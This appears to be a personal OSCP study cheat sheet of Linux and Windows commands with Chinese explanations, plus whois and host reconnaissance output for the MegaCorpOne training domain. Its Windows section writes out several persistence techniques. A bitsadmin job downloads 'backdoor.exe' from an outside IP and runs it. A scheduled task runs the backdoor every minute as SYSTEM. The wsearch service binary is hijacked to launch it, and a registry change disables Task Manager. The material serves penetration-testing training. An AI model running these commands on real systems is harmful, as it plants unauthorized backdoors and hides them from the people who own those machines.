# OSCP

## Parallels & Kali

Kali Linux 2023.2 ARM64
<https://www.kali.org/tools/>

## Linux

### shell

#### find

```shell
touch root_auto_schedule.sh
sudo chown root root_auto_schedule.sh
sudo chmod o+w root_auto_schedule.sh
sudo find / -user root -type f -perm -o=w -iname '*.sh' 2>/dev/null
```

#### cat | cut | uniq | sort

```shell
cat access_log.txt | cut -d " " -f 1 | uniq -c | sort -run
```

---

#### ss

```shell
ss -aptu
```

## Windows

### cmd & powershell

#### systeminfo

```shell
systeminfo /s host1
```

#### set

```shell
echo %temp%
```

#### dir

```shell
dir /a
dir /s *.exe /p
```

#### forfiles

```shell
forfiles /p c:\windows /s /m notepad.exe /c "cmd /s echo @path @fdate @ftime"
```

#### attrib

```shell
attrib -h local_hide.txt
```

#### icaacls

```shell
icacls local_hide.txt /grant Everyone:F
```

### reg

reg 是Windows命令行和脚本中用来操纵注册表的命令。reg 命令的全称是 "Registry Editor" 的缩写，它允许用户在命令行界面中执行注册表操作，如添加、修改、删除注册表键和值。

注册表是Windows操作系统中一个重要的数据库，存储了系统设置和配置信息，包括硬件、软件、用户偏好和系统设置等。通过 reg 命令，可以直接对注册表进行查询和更改，这对于系统管理和故障排除非常有用。

```shell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg add "hkcu\software\microsoftware\windows\currentversion\policies\system" /v disabletaskmgr /t reg_dword /d "1" /f
```

### bitsadmin

bitsadmin是一个Windows命令行工具，用于管理后台智能传输服务（Background Intelligent Transfer Service，简称BITS）。BITS是一项Windows服务，允许文件在网络上以异步方式传输，通常用于在用户不注意的情况下传输文件，如Windows更新或其他应用程序的数据更新。

bitsadmin 工具提供了一系列的命令来创建、监视和控制BITS作业。作业是由一个或多个文件传输组成的，并且可以根据网络条件动态地调整速度，这样在网络使用率低的时候可以更快地传输数据，而在网络繁忙时则减慢速度，避免占用过多带宽。

```shell
bitsadmin /list /allusers /verbose
bitsadmin /info xxx /verbose

bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://1.1.1.1/backdoor.exe" "c:\windows\temp\backdoor.exe"
bitsadmin /SetNotifyCmdLine backdoor "cmd.exe /c c:\windows\temp\backdoor.exe" NULL
bitsadmin /Setminretrydelay backdoor 1
bitsadmin /resume backdoor
```

### schtasks

schtasks 是Windows操作系统中用来创建、删除、查询、更改和运行系统任务计划的命令行工具。任务计划可以用来定时运行脚本或程序，执行系统维护任务，或者自动执行重复的作业。

```shell
schtasks /create /tn 任务名称 /tr 任务运行的命令 /sc 计划类型 /mo 修饰参数 /d 天 /st 开始时间 /ru 运行用户
```

```shell
schtasks /query /fo LIST /v
schtasks /create /tn "backdoor" /tr "c:\windows\temp\backdoor.exe" /sc minute /mo 1 /ru "system"
schtasks /run /tn "backdoor"
```

### sc

sc 是Windows操作系统中用来管理服务的命令行工具。sc 命令可以用来创建、删除、查询、更改和控制服务，如启动、停止、暂停和恢复服务。

```shell
sc query wsearch
sc qc wsearch
sc config wsearch binpath= "cmd.exe /c c:\windows\temp\backdoor.exe"
sc start wsearch
```

### SysinternalsSuit

- PsInfo64.exe /accepteula

---

## Information Gathering

<https://www.megacorpone.com/>

### whois

```shell
╰─❯ whois megacorpone.com
% IANA WHOIS server
% for more information on IANA, visit http://www.iana.org
% This query returned 1 object

refer:        whois.verisign-grs.com

domain:       COM

organisation: VeriSign Global Registry Services
address:      12061 Bluemont Way
address:      Reston VA 20190
address:      United States of America (the)

contact:      administrative
name:         Registry Customer Service
organisation: VeriSign Global Registry Services
address:      12061 Bluemont Way
address:      Reston VA 20190
address:      United States of America (the)
phone:        +1 703 925-6999
fax-no:       +1 703 948 3978
e-mail:       info@verisign-grs.com

contact:      technical
name:         Registry Customer Service
organisation: VeriSign Global Registry Services
address:      12061 Bluemont Way
address:      Reston VA 20190
address:      United States of America (the)
phone:        +1 703 925-6999
fax-no:       +1 703 948 3978
e-mail:       info@verisign-grs.com

nserver:      A.GTLD-SERVERS.NET 192.5.6.30 2001:503:a83e:0:0:0:2:30
nserver:      B.GTLD-SERVERS.NET 192.33.14.30 2001:503:231d:0:0:0:2:30
nserver:      C.GTLD-SERVERS.NET 192.26.92.30 2001:503:83eb:0:0:0:0:30
nserver:      D.GTLD-SERVERS.NET 192.31.80.30 2001:500:856e:0:0:0:0:30
nserver:      E.GTLD-SERVERS.NET 192.12.94.30 2001:502:1ca1:0:0:0:0:30
nserver:      F.GTLD-SERVERS.NET 192.35.51.30 2001:503:d414:0:0:0:0:30
nserver:      G.GTLD-SERVERS.NET 192.42.93.30 2001:503:eea3:0:0:0:0:30
nserver:      H.GTLD-SERVERS.NET 192.54.112.30 2001:502:8cc:0:0:0:0:30
nserver:      I.GTLD-SERVERS.NET 192.43.172.30 2001:503:39c1:0:0:0:0:30
nserver:      J.GTLD-SERVERS.NET 192.48.79.30 2001:502:7094:0:0:0:0:30
nserver:      K.GTLD-SERVERS.NET 192.52.178.30 2001:503:d2d:0:0:0:0:30
nserver:      L.GTLD-SERVERS.NET 192.41.162.30 2001:500:d937:0:0:0:0:30
nserver:      M.GTLD-SERVERS.NET 192.55.83.30 2001:501:b1f9:0:0:0:0:30
ds-rdata:     19718 13 2 8acbb0cd28f41250a80a491389424d341522d946b0da0c0291f2d3d771d7805a

whois:        whois.verisign-grs.com

status:       ACTIVE
remarks:      Registration information: http://www.verisigninc.com

created:      1985-01-01
changed:      2023-12-07
source:       IANA

# whois.verisign-grs.com

   Domain Name: MEGACORPONE.COM
   Registry Domain ID: 1775445745_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.gandi.net
   Registrar URL: http://www.gandi.net
   Updated Date: 2023-06-13T18:08:24Z
   Creation Date: 2013-01-22T23:01:00Z
   Registry Expiry Date: 2024-01-22T23:01:00Z
   Registrar: Gandi SAS
   Registrar IANA ID: 81
   Registrar Abuse Contact Email: abuse@support.gandi.net
   Registrar Abuse Contact Phone: +33.170377661
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
   Name Server: NS1.MEGACORPONE.COM
   Name Server: NS2.MEGACORPONE.COM
   Name Server: NS3.MEGACORPONE.COM
   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of whois database: 2023-12-10T01:35:34Z <<<

# whois.gandi.net

Domain Name: megacorpone.com
Registry Domain ID: 1775445745_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.gandi.net
Registrar URL: http://www.gandi.net
Updated Date: 2023-11-23T21:05:34Z
Creation Date: 2013-01-22T22:01:00Z
Registrar Registration Expiration Date: 2024-01-22T23:01:00Z
Registrar: GANDI SAS
Registrar IANA ID: 81
Registrar Abuse Contact Email: abuse@support.gandi.net
Registrar Abuse Contact Phone: +33.170377661
Reseller:
Domain Status: clientTransferProhibited http://www.icann.org/epp#clientTransferProhibited
Domain Status:
Domain Status:
Domain Status:
Domain Status:
Registry Registrant ID:
Registrant Name: Alan Grofield
Registrant Organization: MegaCorpOne
Registrant Street: 2 Old Mill St
Registrant City: Rachel
Registrant State/Province: Nevada
Registrant Postal Code: 89001
Registrant Country: US
Registrant Phone: +1.9038836342
Registrant Phone Ext:
Registrant Fax:
Registrant Fax Ext:
Registrant Email: 3310f82fb4a8f79ee9a6bfe8d672d87e-1696395@contact.gandi.net
Registry Admin ID:
Admin Name: Alan Grofield
Admin Organization: MegaCorpOne
Admin Street: 2 Old Mill St
Admin City: Rachel
Admin State/Province: Nevada
Admin Postal Code: 89001
Admin Country: US
Admin Phone: +1.9038836342
Admin Phone Ext:
Admin Fax:
Admin Fax Ext:
Admin Email: 3310f82fb4a8f79ee9a6bfe8d672d87e-1696395@contact.gandi.net
Registry Tech ID:
Tech Name: Alan Grofield
Tech Organization: MegaCorpOne
Tech Street: 2 Old Mill St
Tech City: Rachel
Tech State/Province: Nevada
Tech Postal Code: 89001
Tech Country: US
Tech Phone: +1.9038836342
Tech Phone Ext:
Tech Fax:
Tech Fax Ext:
Tech Email: 3310f82fb4a8f79ee9a6bfe8d672d87e-1696395@contact.gandi.net
Name Server: NS1.MEGACORPONE.COM
Name Server: NS2.MEGACORPONE.COM
Name Server: NS3.MEGACORPONE.COM
Name Server:
Name Server:
Name Server:
Name Server:
Name Server:
Name Server:
Name Server:
DNSSEC: Unsigned
URL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/
>>> Last update of WHOIS database: 2023-12-10T01:35:54Z <<<
```

### host

```shell
╰─❯ host NS1.MEGACORPONE.COM
NS1.MEGACORPONE.COM has address 51.79.37.18
```

### google hacking

<https://www.exploit-db.com/google-hacking-database>

---

## Tips

1.
